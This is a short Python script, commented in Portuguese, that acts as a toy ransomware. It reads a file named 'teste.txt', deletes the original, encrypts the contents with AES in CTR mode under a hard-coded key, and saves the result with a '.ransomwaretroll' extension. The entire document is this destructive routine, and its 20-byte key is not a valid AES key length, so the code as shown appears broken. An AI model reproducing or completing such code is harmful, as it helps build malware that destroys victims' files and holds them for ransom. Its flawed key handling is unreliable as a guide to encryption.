import os
import pyaes

## Abre o arquivo teste.txt

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## Remove o arquivo original

os.remove(file_name)

## Define a chave de encriptação

key = b"testetestandotestado"
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografa o arquivo

crypto_data = aes.encrypt(file_data)

## Salva o novo arquivo

new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
